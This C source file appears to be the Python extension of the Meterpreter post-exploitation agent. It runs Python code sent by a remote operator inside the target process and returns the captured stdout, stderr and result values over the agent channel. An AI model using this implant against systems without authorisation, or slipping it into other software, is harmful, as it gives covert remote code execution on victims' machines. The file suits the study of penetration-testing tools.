/*!
 * @file python_commands.c
 * @brief Definitions for the python command bindings.
 */
#include "Python.h"
#include "python_main.h"
#include "python_commands.h"

static LIST* stderrBuffer = NULL;
static LIST* stdoutBuffer = NULL;

static PyObject* handle_write(LIST* target, PyObject* self, PyObject* args)
{
	const char* written = NULL;
	if (PyArg_ParseTuple(args, "s", &written))
	{
		dprintf("[PYTHON] something written to %p: %s", target, written);
		list_add(target, strdup(written));
	}
	else
	{
		dprintf("[PYTHON] something written to %p (can't parse)", target);
	}
	return Py_BuildValue("");
}

static PyObject* handle_stderr(PyObject* self, PyObject* args)
{
	return handle_write(stderrBuffer, self, args);
}

static PyObject* handle_stdout(PyObject* self, PyObject* args)
{
	return handle_write(stdoutBuffer, self, args);
}

static PyMethodDef meterpreter_stdout_hooks[] =
{
	{ "write", handle_stdout, METH_VARARGS, "Write something to stdout" },
	{ NULL, NULL, 0, NULL }
};

static PyMethodDef meterpreter_stderr_hooks[] =
{
	{ "write", handle_stderr, METH_VARARGS, "Write something to stderr" },
	{ NULL, NULL, 0, NULL }
};

static VOID dump_to_packet_and_destroy(LIST* source, Packet* packet, UINT tlvType)
{
	lock_acquire(source->lock);

	PNODE current = source->start;

	while (current != NULL)
	{
		packet_add_tlv_string(packet, tlvType, (LPCSTR)current->data);
		current = current->next;
	}

	lock_release(source->lock);
	list_destroy(source);
}

/*!
 * @brief Hook into key bits of python (such as stdout/stderr)
 */
VOID initialize_hooks()
{
	PyObject* stdoutModule = Py_InitModule("meterpreter_stdout", meterpreter_stdout_hooks);

	if (stdoutModule != NULL && PySys_SetObject("stdout", stdoutModule) == 0)
	{
		dprintf("[PYTHON] Successfully set the stdout hook");
	}
	else
	{
		dprintf("[PYTHON] Failed to set the stdout hook");
	}

	PyObject* stderrModule = Py_InitModule("meterpreter_stderr", meterpreter_stderr_hooks);
	if (stderrModule != NULL && PySys_SetObject("stderr", stderrModule) == 0)
	{
		dprintf("[PYTHON] Successfully set the stderr hook");
	}
	else
	{
		dprintf("[PYTHON] Failed to set the stderr hook");
	}
}

/*!
 * @brief Reset/restart the interpreter.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_python_reset(Remote* remote, Packet* packet)
{
	dprintf("[PYTHON] resetting the interpreter");
	Py_Finalize();
	Py_Initialize();
	initialize_hooks();
	packet_transmit_empty_response(remote, packet, ERROR_SUCCESS);

	return ERROR_SUCCESS;
}

/*!
 * @brief Execute a block of python given in a string and return the result/output.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_python_execute_string(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);
	CHAR* pythonCode = packet_get_tlv_value_string(packet, TLV_TYPE_EXTENSION_PYTHON_CODE);

	if (pythonCode != NULL)
	{
		dprintf("[PYTHON] attempting to run string: %s", pythonCode);

		stderrBuffer = list_create();
		stdoutBuffer = list_create();

		PyRun_SimpleString(pythonCode);

		CHAR* resultVar = packet_get_tlv_value_string(packet, TLV_TYPE_EXTENSION_PYTHON_RESULT_VAR);
		if (resultVar)
		{
			PyObject* mainModule = PyImport_AddModule("__main__");
			if (mainModule != NULL)
			{
				PyObject* mainDict = PyModule_GetDict(mainModule);
				if (mainDict != NULL)
				{
					PyObject* result = PyDict_GetItemString(mainDict, resultVar);
					if (result != NULL)
					{
						if (PyString_Check(result))
						{
							// result is already a string
							packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PYTHON_RESULT, PyString_AsString(result));
						}
						else
						{
							PyObject* resultStr = PyObject_Str(result);
							packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PYTHON_RESULT, PyString_AsString(resultStr));
							Py_DECREF(resultStr);
						}
					}
				}
			}
		}

		dump_to_packet_and_destroy(stderrBuffer, response, TLV_TYPE_EXTENSION_PYTHON_STDERR);
		dump_to_packet_and_destroy(stdoutBuffer, response, TLV_TYPE_EXTENSION_PYTHON_STDOUT);

		stderrBuffer = NULL;
		stdoutBuffer = NULL;

		packet_transmit_response(dwResult, remote, response);
	}

	return dwResult;
}